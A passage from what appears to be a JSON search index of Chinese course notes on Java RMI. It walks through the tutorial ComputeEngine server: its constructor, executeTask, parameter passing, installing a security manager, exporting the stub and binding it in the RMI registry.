\u7c7b\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7c7b\uff0c\u8be5\u7c7b\u5b9e\u73b0\u5355\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u800c\u6ca1\u6709\u5176\u4ed6\u63a5\u53e3\u3002 ComputeEngine \u7c7b\u8fd8\u5305\u542b\u4e24\u4e2a\u53ea\u80fd\u5728\u672c\u5730\u8c03\u7528\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u5143\u7d20\u3002 \u8fd9\u4e9b\u5143\u7d20\u4e2d\u7684\u7b2c\u4e00\u4e2a\u662f ComputeEngine \u5b9e\u4f8b\u7684\u6784\u9020\u51fd\u6570\u3002 \u8fd9\u4e9b\u5143\u7d20\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u662f\u7528\u4e8e\u521b\u5efa ComputeEngine \u5b9e\u4f8b\u5e76\u5c06\u5176\u63d0\u4f9b\u7ed9\u5ba2\u6237\u7aef\u7684 main \u65b9\u6cd5\u3002","title":"4.2.1. \u58f0\u660e\u6b63\u5728\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#422","text":"ComputeEngine \u7c7b\u5177\u6709\u4e00\u4e2a\u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u3002 \u6784\u9020\u51fd\u6570\u7684\u4ee3\u7801\u5982\u4e0b\uff1a public ComputeEngine() { super(); } \u8be5\u6784\u9020\u51fd\u6570\u4ec5\u8c03\u7528\u8d85\u7c7b\u6784\u9020\u51fd\u6570\uff0c\u5b83\u662f Object \u7c7b\u7684\u65e0\u53c2\u6570\u6784\u9020\u51fd\u6570\u3002 \u5c3d\u7ba1\u8fd9\u91cc\u53ef\u4ee5\u7701\u7565\uff0c\u4f46\u4e3a\u4e86\u63cf\u8ff0\u6e05\u695a\u8fd8\u662f\u5c06\u5176\u5305\u62ec\u5728\u5185\u3002","title":"4.2.2. \u5b9a\u4e49\u8fdc\u7a0b\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#423","text":"\u8fdc\u7a0b\u5bf9\u8c61\u7684\u7c7b\u4e3a\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u6307\u5b9a\u7684\u6bcf\u4e2a\u8fdc\u7a0b\u65b9\u6cd5\u63d0\u4f9b\u5b9e\u73b0\u3002 Compute\u63a5\u53e3\u5305\u542b\u4e00\u4e2a\u8fdc\u7a0b\u65b9\u6cd5executeTask\uff0c\u8be5\u65b9\u6cd5\u5982\u4e0b\u5b9e\u73b0\uff1a public <T> T executeTask(Task<T> t) { return t.execute(); } \u6b64\u65b9\u6cd5\u5b9e\u73b0 ComputeEngine \u8fdc\u7a0b\u5bf9\u8c61\u4e0e\u5176\u5ba2\u6237\u7aef\u4e4b\u95f4\u7684\u534f\u8bae\u3002 \u6bcf\u4e2a\u5ba2\u6237\u7aef\u5411 ComputeEngine \u63d0\u4f9b\u4e00\u4e2a Task \u5bf9\u8c61\uff0c\u8be5 Task \u5bf9\u8c61\u5177\u6709 Task \u63a5\u53e3\u7684 execute \u65b9\u6cd5\u7684\u7279\u5b9a\u5b9e\u73b0\u3002 ComputeEngine \u6267\u884c\u6bcf\u4e2a\u5ba2\u6237\u7aef\u7684\u4efb\u52a1\uff0c\u5e76\u5c06\u4efb\u52a1\u7684 execute \u65b9\u6cd5\u7684\u7ed3\u679c\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002","title":"4.2.3. \u63d0\u4f9b\u6bcf\u79cd\u8fdc\u7a0b\u65b9\u6cd5\u7684\u5b9e\u73b0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#424-rmi","text":"\u8fdc\u7a0b\u65b9\u6cd5\u7684\u53c2\u6570\u6216\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8fd4\u56de\u7684\u503c\u51e0\u4e4e\u53ef\u4ee5\u662f\u4efb\u4f55\u7c7b\u578b\uff0c\u5305\u62ec\u672c\u5730\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u5bf9\u8c61\u548c\u539f\u59cb\u6570\u636e\u7c7b\u578b\u3002\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u4efb\u4f55\u7c7b\u578b\u7684\u4efb\u4f55\u5b9e\u4f53\u90fd\u53ef\u4ee5\u4f20\u5165\u6216\u4f20\u51fa\u8fdc\u7a0b\u65b9\u6cd5\uff0c\u53ea\u8981\u8be5\u5b9e\u4f53\u662f\u4f5c\u4e3a\u539f\u59cb\u6570\u636e\u7c7b\u578b\uff0c\u8fdc\u7a0b\u5bf9\u8c61\u6216\u53ef\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u7c7b\u578b\u7684\u5b9e\u4f8b\u5373\u53ef\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u5b9e\u73b0\u4e86\u63a5\u53e3 java.io.Serializable \u3002 \u67d0\u4e9b\u5bf9\u8c61\u7c7b\u578b\u4e0d\u6ee1\u8db3\u4efb\u4f55\u8fd9\u4e9b\u6761\u4ef6\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f20\u9012\u7ed9\u8fdc\u7a0b\u65b9\u6cd5\u6216\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8fd4\u56de\u3002 \u8fd9\u4e9b\u5bf9\u8c61\u4e2d\u7684\u5927\u591a\u6570\uff08\u4f8b\u5982\u7ebf\u7a0b\u6216\u6587\u4ef6\u63cf\u8ff0\u7b26\uff09\u90fd\u5c01\u88c5\u4e86\u4ec5\u5728\u5355\u4e2a\u5730\u5740\u7a7a\u95f4\u5185\u6709\u610f\u4e49\u7684\u4fe1\u606f\u3002 \u8bb8\u591a\u6838\u5fc3\u7c7b\uff08\u5305\u62ec\u8f6f\u4ef6\u5305 java.lang \u548c java.util \u4e2d\u7684\u7c7b\uff09\u90fd\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\u3002 \u63a7\u5236\u5982\u4f55\u4f20\u9012\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u89c4\u5219\u5982\u4e0b\uff1a \u8fdc\u7a0b\u5bf9\u8c61\u672c\u8d28\u4e0a\u662f\u901a\u8fc7\u5f15\u7528\u4f20\u9012\u7684 \u3002 \u8fdc\u7a0b\u5bf9\u8c61\u5f15\u7528\u662f\u4e00\u4e2a\u5b58\u6839\uff0c\u5b83\u662f\u4e00\u4e2a\u5ba2\u6237\u7aef\u4ee3\u7406\uff0c\u53ef\u5b9e\u73b0\u8be5\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u5b8c\u6574\u7684\u8fdc\u7a0b\u63a5\u53e3\u96c6\u3002 \u4f7f\u7528\u5bf9\u8c61\u5e8f\u5217\u5316\uff0c\u672c\u5730\u5bf9\u8c61\u901a\u8fc7\u526f\u672c\u4f20\u9012 \u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5c06\u590d\u5236\u6240\u6709\u5b57\u6bb5\uff0c\u4f46\u6807\u8bb0\u4e3a\u9759\u6001\u6216\u77ac\u6001\u7684\u5b57\u6bb5\u9664\u5916\u3002 \u53ef\u4ee5\u9010\u7ea7\u8986\u76d6\u9ed8\u8ba4\u5e8f\u5217\u5316\u884c\u4e3a\u3002 \u901a\u8fc7\u5f15\u7528\u4f20\u9012\u8fdc\u7a0b\u5bf9\u8c61\u610f\u5473\u7740\uff0c\u901a\u8fc7\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u5bf9\u5bf9\u8c61\u72b6\u6001\u6240\u505a\u7684\u4efb\u4f55\u66f4\u6539\uff0c\u90fd\u5c06\u53cd\u6620\u5728\u539f\u59cb\u8fdc\u7a0b\u5bf9\u8c61\u4e2d\u3002\u4f20\u9012\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u53ea\u6709\u4f5c\u4e3a\u8fdc\u7a0b\u63a5\u53e3\u7684\u90a3\u4e9b\u63a5\u53e3\u53ef\u7528\u4e8e\u63a5\u6536\u5668\u3002\u5728\u5b9e\u73b0\u7c7b\u4e2d\u5b9a\u4e49\u7684\u65b9\u6cd5\u6216\u5728\u7531\u8be5\u7c7b\u5b9e\u73b0\u7684\u975e\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u4efb\u4f55\u65b9\u6cd5\u5747\u4e0d\u9002\u7528\u4e8e\u8be5\u63a5\u6536\u8005\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u8981\u5c06\u5f15\u7528\u4f20\u9012\u7ed9 ComputeEngine \u7c7b\u7684\u5b9e\u4f8b\uff0c\u5219\u63a5\u6536\u65b9\u5c06\u53ea\u80fd\u8bbf\u95ee\u8ba1\u7b97\u5f15\u64ce\u7684 executeTask \u65b9\u6cd5\u3002\u8be5\u63a5\u6536\u8005\u5c06\u770b\u4e0d\u5230 ComputeEngine \u6784\u9020\u51fd\u6570\uff0c\u5176 main \u65b9\u6cd5\u6216 java.lang.Object \u7684\u4efb\u4f55\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002 \u5728\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u4e2d\uff0c\u4e0d\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5bf9\u8c61\u5c06\u6309\u503c\u4f20\u9012\u3002\u56e0\u6b64\uff0c\u5728\u63a5\u6536 Java \u865a\u62df\u673a\u4e2d\u521b\u5efa\u5bf9\u8c61\u7684\u526f\u672c\u3002\u63a5\u6536\u8005\u5bf9\u5bf9\u8c61\u72b6\u6001\u7684\u4efb\u4f55\u66f4\u6539\u4ec5\u53cd\u6620\u5728\u63a5\u6536\u8005\u7684\u526f\u672c\u4e2d\uff0c\u800c\u4e0d\u53cd\u6620\u5728\u53d1\u9001\u8005\u7684\u539f\u59cb\u5b9e\u4f8b\u4e2d\u3002\u53d1\u9001\u8005\u5bf9\u5bf9\u8c61\u72b6\u6001\u7684\u4efb\u4f55\u66f4\u6539\u4ec5\u53cd\u6620\u5728\u53d1\u9001\u8005\u7684\u539f\u59cb\u5b9e\u4f8b\u4e2d\uff0c\u800c\u4e0d\u53cd\u6620\u5728\u63a5\u6536\u8005\u7684\u526f\u672c\u4e2d\u3002","title":"4.2.4. \u5728RMI\u4e2d\u4f20\u9012\u5bf9\u8c61"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#425-main","text":"ComputeEngine \u5b9e\u73b0\u4e2d\u6700\u590d\u6742\u7684\u65b9\u6cd5\u662f main \u65b9\u6cd5\u3002 \u4e3b\u8981\u65b9\u6cd5\u7528\u4e8e\u542f\u52a8 ComputeEngine \uff0c\u56e0\u6b64\u9700\u8981\u8fdb\u884c\u5fc5\u8981\u7684\u521d\u59cb\u5316\u7b49\u7b49\uff0c\u4ee5\u4f7f\u670d\u52a1\u5668\u51c6\u5907\u597d\u63a5\u53d7\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8c03\u7528\u3002 \u6b64\u65b9\u6cd5\u4e0d\u662f\u8fdc\u7a0b\u65b9\u6cd5\uff0c\u8fd9\u610f\u5473\u7740\u65e0\u6cd5\u4ece\u5176\u4ed6 Java \u865a\u62df\u673a\u8c03\u7528\u5b83\u3002 \u7531\u4e8e main \u65b9\u6cd5\u88ab\u58f0\u660e\u4e3a\u9759\u6001\u65b9\u6cd5\uff0c\u56e0\u6b64\u8be5\u65b9\u6cd5\u6839\u672c\u4e0d\u4e0e\u5bf9\u8c61\u5173\u8054\uff0c\u800c\u662f\u4e0e ComputeEngine \u7c7b\u5173\u8054\u3002","title":"4.2.5. \u5b9e\u73b0\u670d\u52a1\u5668\u7aef\u7684main\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#426","text":"\u4e3b\u8981\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\u662f\u521b\u5efa\u5e76\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\uff0c\u4ee5\u4fdd\u62a4\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u4e0d\u53d7 Java \u865a\u62df\u673a\u4e2d\u8fd0\u884c\u7684\u4e0d\u53ef\u4fe1\u4e0b\u8f7d\u4ee3\u7801\u7684\u8bbf\u95ee\u3002 \u5b89\u5168\u7ba1\u7406\u5668\u786e\u5b9a\u4e0b\u8f7d\u7684\u4ee3\u7801\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u6216\u53ef\u4ee5\u6267\u884c\u4efb\u4f55\u5176\u4ed6\u7279\u6743\u64cd\u4f5c\u3002 \u5982\u679c RMI \u7a0b\u5e8f\u672a\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\uff0c\u5219 RMI \u5c06\u4e0d\u4f1a\u4e0b\u8f7d\u4f5c\u4e3a\u81ea\u53d8\u91cf\u63a5\u6536\u5230\u7684\u5bf9\u8c61\u6216\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u8fd4\u56de\u503c\u7684\u5bf9\u8c61\u7684\u7c7b\uff08\u4ece\u672c\u5730\u7c7b\u8def\u5f84\u4e4b\u5916\uff09\u3002 \u6b64\u9650\u5236\u786e\u4fdd\u4e86\u7531\u4e0b\u8f7d\u7684\u4ee3\u7801\u6267\u884c\u7684\u64cd\u4f5c\u5fc5\u987b\u9075\u5b88\u5b89\u5168\u7b56\u7565\u3002 \u8fd9\u662f\u521b\u5efa\u548c\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\u7684\u4ee3\u7801\uff1a if (System.getSecurityManager() == null) { System.setSecurityManager(new SecurityManager()); }","title":"4.2.6. \u521b\u5efa\u548c\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#427","text":"\u63a5\u4e0b\u6765\uff0c main \u65b9\u6cd5\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u521b\u5efa ComputeEngine \u5b9e\u4f8b\u5e76\u5c06\u5176\u5bfc\u51fa\u5230 RMI \u8fd0\u884c\u65f6\uff1a Compute engine = new ComputeEngine(); Compute stub = (Compute) UnicastRemoteObject.exportObject(engine, 0); \u9759\u6001 UnicastRemoteObject.exportObject \u65b9\u6cd5\u5bfc\u51fa\u63d0\u4f9b\u7684\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u4ee5\u4fbf\u5b83\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u5ba2\u6237\u7aef\u63a5\u6536\u5176\u8fdc\u7a0b\u65b9\u6cd5\u7684\u8c03\u7528\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570int\u6307\u5b9a\u7528\u4e8e\u4fa6\u542c\u8be5\u5bf9\u8c61\u7684\u4f20\u5165\u8fdc\u7a0b\u8c03\u7528\u8bf7\u6c42\u7684TCP\u7aef\u53e3\u3002\u901a\u5e38\u4f7f\u7528\u96f6\u503c\uff0c\u8be5\u503c\u6307\u5b9a\u4f7f\u7528\u533f\u540d\u7aef\u53e3\u3002\u7136\u540e\uff0c\u5b9e\u9645\u7aef\u53e3\u5c06\u5728\u8fd0\u884c\u65f6\u7531RMI\u6216\u57fa\u7840\u64cd\u4f5c\u7cfb\u7edf\u9009\u62e9\u3002\u4f46\u662f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u975e\u96f6\u503c\u6765\u6307\u5b9a\u7528\u4e8e\u4fa6\u542c\u7684\u7279\u5b9a\u7aef\u53e3\u3002\u6210\u529f\u5bfc\u51fa exportObject \u8c03\u7528\u540e\uff0c ComputeEngine \u8fdc\u7a0b\u5bf9\u8c61\u5df2\u51c6\u5907\u5c31\u7eea\uff0c\u53ef\u4ee5\u5904\u7406\u4f20\u5165\u7684\u8fdc\u7a0b\u8c03\u7528\u3002 exportObject \u65b9\u6cd5\u8fd4\u56de\u5bfc\u51fa\u7684\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u3002\u8bf7\u6ce8\u610f\uff0c\u53d8\u91cf\u5b58\u6839\u7684\u7c7b\u578b\u5fc5\u987b\u662f Compute \uff0c\u800c\u4e0d\u662f ComputeEngine \uff0c\u56e0\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u4ec5\u5b9e\u73b0\u5bfc\u51fa\u7684\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3\u3002 exportObject \u65b9\u6cd5\u58f0\u660e\u5b83\u53ef\u4ee5\u5f15\u53d1 RemoteException \uff0c\u8fd9\u662f\u4e00\u4e2a\u7ecf\u8fc7\u68c0\u67e5\u7684\u5f02\u5e38\u7c7b\u578b\u3002 main \u65b9\u6cd5\u4f7f\u7528\u5176 try / catch \u5757\u5904\u7406\u6b64\u5f02\u5e38\u3002\u5982\u679c\u672a\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5904\u7406\u5f02\u5e38\uff0c\u5219\u5fc5\u987b\u5728 main \u65b9\u6cd5\u7684 throws \u5b50\u53e5\u4e2d\u58f0\u660e RemoteException \u3002\u5982\u679c\u6ca1\u6709\u5fc5\u8981\u7684\u901a\u4fe1\u8d44\u6e90\uff08\u4f8b\u5982\uff0c\u8bf7\u6c42\u7684\u7aef\u53e3\u7ed1\u5b9a\u7528\u4e8e\u5176\u4ed6\u76ee\u7684\uff09\uff0c\u5219\u5c1d\u8bd5\u5bfc\u51fa\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u80fd\u4f1a\u5f15\u53d1 RemoteException \u3002 \u5728\u5ba2\u6237\u7aef\u53ef\u4ee5\u5728\u8fdc\u7a0b\u5bf9\u8c61\u4e0a\u8c03\u7528\u65b9\u6cd5\u4e4b\u524d\uff0c\u5ba2\u6237\u7aef\u5fc5\u987b\u9996\u5148\u83b7\u53d6\u5bf9\u8be5\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u53ef\u4ee5\u901a\u8fc7\u5728\u7a0b\u5e8f\u4e2d\u83b7\u5f97\u4efb\u4f55\u5176\u4ed6\u5bf9\u8c61\u5f15\u7528\u7684\u65b9\u5f0f\u6765\u83b7\u5f97\u5f15\u7528\uff0c\u4f8b\u5982\u901a\u8fc7\u5c06\u5f15\u7528\u4f5c\u4e3a\u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u4e00\u90e8\u5206\u6216\u5305\u542b\u6b64\u7c7b\u5f15\u7528\u7684\u6570\u636e\u7ed3\u6784\u7684\u4e00\u90e8\u5206\u6765\u83b7\u53d6\u3002 \u7cfb\u7edf\u63d0\u4f9b\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u8fdc\u7a0b\u5bf9\u8c61RMI\u6ce8\u518c\u8868\uff0c\u7528\u4e8e\u67e5\u627e\u5bf9\u5176\u4ed6\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002 RMI\u6ce8\u518c\u8868\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8fdc\u7a0b\u5bf9\u8c61\u547d\u540d\u670d\u52a1\uff0c\u4f7f\u5ba2\u6237\u7aef\u80fd\u591f\u901a\u8fc7\u540d\u79f0\u83b7\u5f97\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u6ce8\u518c\u8868\u901a\u5e38\u4ec5\u7528\u4e8e\u67e5\u627eRMI\u5ba2\u6237\u7aef\u9700\u8981\u4f7f\u7528\u7684\u7b2c\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u3002\u7136\u540e\uff0c\u7b2c\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u80fd\u4f1a\u4e3a\u67e5\u627e\u5176\u4ed6\u5bf9\u8c61\u63d0\u4f9b\u652f\u6301\u3002 java.rmi.registry.Registry \u8fdc\u7a0b\u63a5\u53e3\u662f\u7528\u4e8e\u7ed1\u5b9a\uff08\u6216\u6ce8\u518c\uff09\u548c\u5728\u6ce8\u518c\u8868\u4e2d\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\u7684API\u3002 java.rmi.registry.LocateRegistry \u7c7b\u63d0\u4f9b\u4e86\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u4e8e\u5408\u6210\u5bf9\u7279\u5b9a\u7f51\u7edc\u5730\u5740\uff08\u4e3b\u673a\u548c\u7aef\u53e3\uff09\u4e0a\u6ce8\u518c\u8868\u7684\u8fdc\u7a0b\u5f15\u7528\u3002\u8fd9\u4e9b\u65b9\u6cd5\u5c06\u521b\u5efa\u5305\u542b\u6307\u5b9a\u7f51\u7edc\u5730\u5740\u7684\u8fdc\u7a0b\u5f15\u7528\u5bf9\u8c61\uff0c\u800c\u4e0d\u6267\u884c\u4efb\u4f55\u8fdc\u7a0b\u901a\u4fe1\u3002 LocateRegistry \u8fd8\u63d0\u4f9b\u4e86\u7528\u4e8e\u5728\u5f53\u524d Java \u865a\u62df\u673a\u4e2d\u521b\u5efa\u65b0\u6ce8\u518c\u8868\u7684\u9759\u6001\u65b9\u6cd5\uff0c\u5c3d\u7ba1\u672c\u793a\u4f8b\u672a\u4f7f\u7528\u8fd9\u4e9b\u65b9\u6cd5\u3002\u5728\u672c\u5730\u4e3b\u673a\u4e0a\u7684RMI\u6ce8\u518c\u8868\u4e2d\u6ce8\u518c\u4e86\u8fdc\u7a0b\u5bf9\u8c61\u540e\uff0c\u4efb\u4f55\u4e3b\u673a\u4e0a\u7684\u5ba2\u6237\u7aef\u90fd\u53ef\u4ee5\u6309\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u83b7\u53d6\u5176\u5f15\u7528\uff0c\u7136\u540e\u5728\u8be5\u5bf9\u8c61\u4e0a\u8c03\u7528\u8fdc\u7a0b\u65b9\u6cd5\u3002\u6ce8\u518c\u8868\u53ef\u4ee5\u7531\u4e3b\u673a\u4e0a\u8fd0\u884c\u7684\u6240\u6709\u670d\u52a1\u5668\u5171\u4eab\uff0c\u6216\u8005\u5355\u4e2a\u670d\u52a1\u5668\u8fdb\u7a0b\u53ef\u4ee5\u521b\u5efa\u548c\u4f7f\u7528\u5176\u81ea\u5df1\u7684\u6ce8\u518c\u8868\u3002 ComputeEngine \u7c7b\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u4e3a\u5bf9\u8c61\u521b\u5efa\u540d\u79f0\uff1a String name = \"Compute\"; \u7136\u540e\uff0c\u4ee3\u7801\u5c06\u540d\u79f0\u6dfb\u52a0\u5230\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684RMI\u6ce8\u518c\u8868\u4e2d\u3002 \u7a0d\u540e\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b8c\u6210\u6b64\u6b65\u9aa4\uff1a Registry registry = LocateRegistry.getRegistry(); registry.rebind(name, stub); \u6b64\u91cd\u65b0\u7ed1\u5b9a\u8c03\u7528\u5bf9\u672c\u5730\u4e3b\u673a\u4e0a\u7684 RMI \u6ce8\u518c\u8868\u8fdb\u884c\u4e86\u8fdc\u7a0b\u8c03\u7528\u3002\u50cf\u4efb\u4f55\u8fdc\u7a0b\u8c03\u7528\u4e00\u6837\uff0c\u6b64\u8c03\u7528\u53ef\u80fd\u5bfc\u81f4\u5f15\u53d1 RemoteException \uff0c\u8be5\u5f02\u5e38\u7531 main \u65b9\u6cd5\u672b\u5c3e\u7684 catch \u5757\u5904\u7406\u3002 \u8bf7\u6ce8\u610f\u4ee5\u4e0b\u6709\u5173 Registry.rebind \u8c03\u7528\u7684\u5185\u5bb9\uff1a LocateRegistry.getRegistry \u7684\u65e0\u53c2\u6570\u91cd\u8f7d\u5c06\u5bf9\u672c\u5730\u4e3b\u673a\u548c\u9ed8\u8ba4\u6ce8\u518c\u8868\u7aef\u53e3 1099 \u4e0a\u6ce8\u518c\u8868\u7684\u5f15\u7528\u8fdb\u884c\u7efc\u5408\u3002\u5982\u679c\u5728 1099 \u4ee5\u5916\u7684\u7aef\u53e3\u4e0a\u521b\u5efa\u4e86\u6ce8\u518c\u8868\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u5177\u6709 int \u53c2\u6570\u7684\u91cd\u8f7d\u3002 \u5728\u6ce8\u518c\u8868\u4e0a\u8fdb\u884c\u8fdc\u7a0b\u8c03\u7528\u65f6\uff0c\u5c06\u4f20\u9012\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u800c\u4e0d\u662f\u8fdc\u7a0b\u5bf9\u8c61\u672c\u8eab\u7684\u526f\u672c\u3002\u8bf8 ComputeEngine \u5b9e\u4f8b\u4e4b\u7c7b\u7684\u8fdc\u7a0b\u5b9e\u73b0\u5bf9\u8c61\u6c38\u8fdc\u4e0d\u4f1a\u79bb\u5f00\u521b\u5efa\u5b83\u4eec\u7684 Java \u865a\u62df\u673a\u3002\u56e0\u6b64\uff0c\u5f53\u5ba2\u6237\u7aef\u5728\u670d\u52a1\u5668\u7684\u8fdc\u7a0b\u5bf9\u8c61\u6ce8\u518c\u8868\u4e2d\u6267\u884c\u67e5\u627e\u65f6\uff0c\u5c06\u8fd4\u56de\u5b58\u6839\u7684\u526f\u672c\u3002\u56e0\u6b64\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u5bf9\u8c61\u901a\u8fc7\uff08\u8fdc\u7a0b\uff09\u5f15\u7528\u800c\u4e0d\u662f\u901a\u8fc7\u503c\u6709\u6548\u5730\u4f20\u9012\u3002 \u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ea\u80fd\u4e0e\u5728\u540c\u4e00\u4e3b\u673a\u4e0a\u8fd0\u884c\u7684\u6ce8\u518c\u8868\u7ed1\u5b9a\uff0c\u53d6\u6d88\u7ed1\u5b9a\u6216\u91cd\u65b0\u7ed1\u5b9a\u8fdc\u7a0b\u5bf9\u8c61\u5f15\u7528\u3002\u6b64\u9650\u5236\u53ef\u9632\u6b62\u8fdc\u7a0b\u5ba2\u6237\u7aef\u5220\u9664\u6216\u8986\u76d6\u670d\u52a1\u5668\u6ce8\u518c\u8868\u4e2d\u7684\u4efb\u4f55\u6761\u76ee\u3002\u4f46\u662f\uff0c\u53ef\u4ee5\u4ece\u4efb\u4f55\u672c\u5730\u6216\u8fdc\u7a0b\u4e3b\u673a\u8bf7\u6c42\u67e5\u627e\u3002 \u670d\u52a1\u5668\u5728\u672c\u5730 RMI \u6ce8\u518c\u8868\u4e2d\u6ce8\u518c\u540e\uff0c\u5c06\u663e\u793a\u4e00\u6761\u6d88\u606f\uff0c\u8868\u660e\u5b83\u5df2\u51c6\u5907\u597d\u5f00\u59cb\u5904\u7406\u547c\u53eb\u3002\u7136\u540e\uff0c main \u65b9\u6cd5\u5b8c\u6210\u3002\u4e0d\u5fc5\u7b49\u5f85\u7ebf\u7a0b\u4f7f\u670d\u52a1\u5668\u4fdd\u6301\u6d3b\u52a8\u72b6\u6001\u3002\u53ea\u8981\u5728\u672c\u5730\u6216\u8fdc\u7a0b\u7684\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u4e2d\u5f15\u7528\u4e86 ComputeEngine \u5bf9\u8c61\uff0c\u5c31\u4e0d\u4f1a\u5173\u95ed ComputeEngine \u5bf9\u8c61\u6216\u5bf9\u5176\u8fdb\u884c\u5783\u573e\u56de\u6536\u3002\u7531\u4e8e\u7a0b\u5e8f\u5c06\u5bf9\u6ce8\u518c\u8868\u7684\u5f15\u7528\u7ed1\u5b9a\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u56e0\u6b64\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u5ba2\u6237\u7aef\uff08\u6ce8\u518c\u8868\u672c\u8eab\uff09\u8bbf\u95ee\u5b83\u3002 RMI \u7cfb\u7edf\u4f7f ComputeEngine 